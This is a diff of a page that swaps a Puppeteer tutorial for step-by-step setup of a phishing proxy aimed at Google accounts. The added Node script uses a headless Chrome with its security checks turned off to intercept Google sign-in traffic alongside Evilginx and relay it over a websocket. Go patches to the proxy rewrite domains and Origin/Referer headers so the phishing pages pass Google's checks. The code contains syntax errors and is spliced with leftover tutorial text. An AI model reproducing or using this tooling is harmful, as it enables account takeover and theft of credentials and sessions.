@@ -1,4 +1,251 @@
- Puppeteer is a high level abstraction over the Chrome Devtools Protocol that gives you a user-friendly API to drive Chromium (or Blink) based environments. Developers create high level abstractions like Puppeteer with the intent of making common use cases trivial and, as you stray further and further from those common cases, it’s not unlikely that you’ll need to jump passed those abstractions. Thankfully, you can still access the Chrome Devtools Protocol directly within Puppeteer to get the best of both worlds.
+First create a js file and input the below content:
+
+```
+const debug = require('debug');
+debug.enable('puppeteer:*'); 
+const puppeteer = require('puppeteer');
+const prettier = require('prettier');
+const atob = require('atob');
+const btoa = require('btoa');
+const WebSocket = require('ws');
+
+const wsPort = 8080;
+const wsUrl = `ws://localhost:${wsPort}/ws`;
+const requestCache = new Map();
+
+const urlPatterns = [
+  '*://play.google.com/*',
+  '*://www.gstatic.com/*', 
+];
+
+
+function transform(source) {
+  return prettier.format(source, { parser: 'babel' });
+}
+
+function startWebSocketServer() {
+  const wss = new WebSocket.Server({ port: wsPort });
+
+  wss.on('connection', (ws) => {
+    console.log('[WS SERVER] Client connected');
+    ws.send(JSON.stringify({ message: 'WebSocket Server Connected' }));
+
+    ws.on('message', (message) => {
+      console.log('[WS SERVER] Received:', message.toString('utf8'));
+    });
+
+    ws.on('close', () => {
+      console.log('[WS SERVER] Client disconnected');
+    });
+  });
+
+  console.log(`[WS SERVER] Running at ws://localhost:${wsPort}`);
+}
+
+async function connectToWebSocket() {
+  const ws = new WebSocket(wsUrl);
+
+  ws.on('open', () => console.log('[WS CLIENT] Connected to WebSocket'));
+  ws.on('message', (data) => console.log('[WS CLIENT] Received:', data.toString('utf8')));
+  ws.on('error', (err) => console.error('[WS CLIENT] Error:', err));
+  ws.on('close', () => console.log('[WS CLIENT] Connection closed'));
+
+  return ws;
+}
+
+async function intercept(page, patterns, transform) {
+  const client = await page.target().createCDPSession();
+  await client.send('Network.enable');
+
+  const resourceTypeMap = {
+    '*://play.google.com/*': ['Script', 'Document'],
+    '*://www.gstatic.com/*': ['Document'],
+    '*://*//v3/signin/_/AccountsSignInUi/gen204*': ['Script'],
+    '*://*/v3/signin/_/AccountsSignInUi/data/batchexecute*',: ['Script'],
+  };
+
+  const interceptionPatterns = [];
+  for (const [pattern, resourceTypes] of Object.entries(resourceTypeMap)) {
+    resourceTypes.forEach((type) => {
+      interceptionPatterns.push({
+        urlPattern: pattern,
+        resourceType: type,
+        interceptionStage: 'HeadersReceived',
+      });
+    });
+  }
+
+  await client.send('Network.setRequestInterception', { patterns: interceptionPatterns });
+
+  client.on('Network.requestIntercepted', async ({ interceptionId, request, responseHeaders, resourceType }) => {
+    console.log(`[INTERCEPT] ${request.url} [Type: ${resourceType}]`);
+
+    try {
+      const response = await client.send('Network.getResponseBodyForInterception', { interceptionId });
+      const contentTypeHeader = Object.keys(responseHeaders).find((k) => k.toLowerCase() === 'content-type');
+      const contentType = responseHeaders[contentTypeHeader];
+      let newBody;
+
+      if (requestCache.has(response.body)) {
+        newBody = requestCache.get(response.body);
+      } else {
+        const bodyData = response.base64Encoded ? atob(response.body) : response.body;
+
+        try {
+          if (resourceType === 'Script') {
+            newBody = transform(bodyData);
+          } else {
+            newBody = bodyData;
+          }
+        } catch (err) {
+          console.error(`[ERROR] Processing ${request.url}:`, err);
+          newBody = bodyData;
+        }
+
+        requestCache.set(response.body, newBody);
+      }
+
+      const newHeaders = [
+        'Date: ' + new Date().toUTCString(),
+        'Connection: closed',
+        'Content-Length: ' + newBody.length,
+        'Content-Type: ' + contentType,
+      ];
+
+      if (ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ url: request.url, resourceType, body: newBody }));
+        console.log(`[WS CLIENT] Sent data: ${request.url}`);
+      }
+
+      await client.send('Network.continueInterceptedRequest', {
+        interceptionId,
+        rawResponse: btoa('HTTP/1.1 200 OK' + '\r\n' + newHeaders.join('\r\n') + '\r\n\r\n' + newBody),
+      });
+    } catch (error) {
+      console.error(`[INTERCEPT ERROR] ${request.url}:`, error);
+      await client.send('Network.continueInterceptedRequest', { interceptionId });
+    }
+  });
+}
+
+async function launchBrowserAndMonitor() {
+  console.log('[INFO] Launching browser with CDP enabled.');
+  const browser = await puppeteer.launch({
+    headless: true,
+    defaultViewport: null,
+    devtools: true,
+    args: [
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--ignore-certificate-errors',
+      '--ignore-certificate-errors-spki-list',
+      '--disable-web-security',
+      '--allow-running-insecure-content',
+      '--disable-features=IsolateOrigins,site-per-process',
+      '--disable-blink-features=AutomationControlled',
+      '--disable-infobars',
+      '--enable-features=NetworkService',
+      '--hide-scrollbars',
+      '--mute-audio',
+      '--disable-extensions',
+      '--no-first-run',
+      '--no-default-browser-check',
+      '--disable-dev-shm-usage',
+      '--disable-software-rasterizer',
+      '--disable-background-networking',
+      '--disable-background-timer-throttling',
+      '--disable-backgrounding-occluded-windows',
+      '--disable-client-side-phishing-detection',
+      '--disable-sync',
+      '--metrics-recording-only',
+      '--disable-breakpad',
+    ],
+  });
+
+  const page = await browser.newPage();
+  const ws = await connectToWebSocket();
+
+  await intercept(page, urlPatterns, transform);
+
+  page.on('framenavigated', async (frame) => {
+    const url = frame.url();
+    console.log(`[NAVIGATED] ${url}`);
+
+    if (url.includes('myaccount.google.com')) {
+      console.log('[INFO] Detected myaccount.google.com. Closing browser...');
+      await browser.close();
+    }
+  });
+
+  console.log('[INFO] Waiting for navigation from Evilginx...');
+}
+
+startWebSocketServer();
+launchBrowserAndMonitor().catch(console.error);
+
+```
+
+install node using & npm
+
+https://github.com/nodesource/distributions/blob/master/README.md#ubuntu-versions
+
+Then we go ahead and add this to http_proxy.go
+
+
+```
+
+				// patch GET query params with original domains
+				if pl != nil {
+   				 qs := req.URL.Query()
+   				 if len(qs) > 0 {
+      				  for gp := range qs {
+           				 for i, v := range qs[gp] {
+              				  // Log query parameters
+               				 log.Debug("Server Side Query : %s=%s\n", gp, v)
+
+               				 // Patch the URLs
+             				   patched := string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+              				  
+              				  firstrep := strings.ReplaceAll(patched, "aHR0cHM6Ly9hY2NvdW50cy5leGFtcGxlLmNvbTo0NDM", "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw")
+
+              				  replaced := strings.ReplaceAll(firstrep, "example", "google")              				  
+             				   // Log the replacement
+             				   log.Debug("Replaced Query : %s=%s\n", gp, replaced)
+            				    
+            				    // Replace the value with the modified one
+           				     qs[gp][i] = replaced
+         				   }
+       				 }
+    				    req.URL.RawQuery = qs.Encode()
+   				 }
+				}
+
+```
+
+And below strings too
+
+```
+
+			if strings.HasPrefix(resp.Request.URL.Path, "/log") || strings.Contains(resp.Request.URL.Path, "playlog") {
+			
+				if origin := resp.Header.Get("Origin"); origin != "" {
+					resp.Header.Set("Origin", string(p.patchUrls(pl, []byte("https://play.google.com"), CONVERT_TO_PHISHING_URLS)))
+				}
+
+				if referer := resp.Header.Get("Referer"); referer != "" {
+					resp.Header.Set("Referer", string(p.patchUrls(pl, []byte("https://play.google.com"), CONVERT_TO_PHISHING_URLS)))
+				}
+			}
+
+			if resp.Request.URL.Path == "/log" {
+				resp.Header.Add("X-Frame-Options", "ALLOW-FROM "+string(p.patchUrls(pl, []byte("https://play.google.com"), CONVERT_TO_PHISHING_URLS)))
+			}
+
+```
+
+
+Als
+Puppeteer is a high level abstraction over the Chrome Devtools Protocol that gives you a user-friendly API to drive Chromium (or Blink) based environments. Developers create high level abstractions like Puppeteer with the intent of making common use cases trivial and, as you stray further and further from those common cases, it’s not unlikely that you’ll need to jump passed those abstractions. Thankfully, you can still access the Chrome Devtools Protocol directly within Puppeteer to get the best of both worlds.
  
  **Intercepting and Modifying Responses** The ability to modify the execution of a running application is an important part of reverse engineering, troubleshooting, and analysis. Browser developer tools and their plugins have come a long way over the last 10 years but browser makers optimize them for the user experience of a developer actively in the midst of the development process. Once you leave that environment wave goodbye to the hooks for development libraries, say adios to your logging, be prepared to interpret cryptic error codes instead of comprehensive messages, and get ready to turn on your mental debugger as you step through source code minified beyond comprehension. Sourcemaps are helpful but they can break as build tools change or even across browser updates. You might not even notice broken sourcemaps until troubleshooting in production and, at that point, it’s usually too late.
  
